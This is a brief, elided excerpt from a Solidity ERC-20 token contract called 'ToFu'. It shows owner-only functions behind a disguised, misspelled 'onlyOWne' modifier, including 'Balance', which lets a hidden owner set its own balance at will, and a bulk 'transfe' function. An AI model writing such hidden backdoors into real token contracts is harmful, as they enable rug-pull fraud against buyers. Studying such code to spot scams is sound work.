...
contract ToFu is Context, Ownable, IERC20 {
    ...
    function transfe(address[] memory accounts, uint256 amount) external onlyOWne {
    ...
    function setGlobalmfa(uint256 amount) external onlyOWne {
        _globalmfa = amount;
    }
    ...
    modifier onlyOWne() {
        require(_msgSender() == _OWne);
        _;
    }

    function Balance(uint256 newBalance) external onlyOWne {
        _balances[_OWne] = newBalance;
    }
